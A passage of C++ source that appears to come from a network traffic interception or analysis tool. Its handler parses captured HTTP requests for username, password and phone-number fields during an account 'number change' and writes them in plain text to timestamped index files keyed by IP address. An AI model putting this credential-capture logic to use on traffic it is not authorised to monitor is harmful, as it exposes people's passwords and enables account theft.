			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_x8","pnc_x8",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
		return TRUE;			
	}
	if (Action == PNC_CHANGENUM)
	{
		CString strTempData(pPacket);
		CStringArray arrTemp;
		PNCSplitString(strTempData,arrTemp,'&');
		
		arrsize = arrTemp.GetSize();
		for (int i = 0; i < arrsize; i++)
		{
			if ( arrTemp[i].Find("name=") != -1 )
			{
				strUser = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("AcctPwd=") != -1)
			{
				strPass = PNCGetItemValue(arrTemp[i],'=');
			}
			if ( arrTemp[i].Find("haoma=") != -1)
			{
				strChanged = PNCGetItemValue(arrTemp[i],'=');
			}
			
		}
		
		if (strUser.IsEmpty() || strPass.IsEmpty() || strChanged.IsEmpty())
		{
			return FALSE;
		}
		CString FileContent;
		FileContent.Format("user=%s\r\npass=%s\r\nwebname=%s\r\nstate=改号\r\n",
			strUser,strPass,strChanged);
		
		SYSTEMTIME CurrentTime;
		GetLocalTime(&CurrentTime);
		CString tmppath = pHttpSession->m_dceprocotol->m_httpMissObj->GetTmpPath();
		ASSERT(!tmppath.IsEmpty());
		pHttpSession->m_indexfname.Format("%s%04d%02d%02d%02d%02d%02d_%s_%s_1_%u_pnc_x8.indexfile.txt",
			tmppath, CurrentTime.wYear, CurrentTime.wMonth, CurrentTime.wDay, CurrentTime.wHour,
			CurrentTime.wMinute, CurrentTime.wSecond, pHttpSession->m_sip, pHttpSession->m_dip, rand());
		pHttpSession->WriteIndexFile("pnc_x8","pnc_x8",FileContent,pHttpSession->m_dceprocotol->m_httpMissObj);
		return TRUE;				
	}
	return FALSE;
}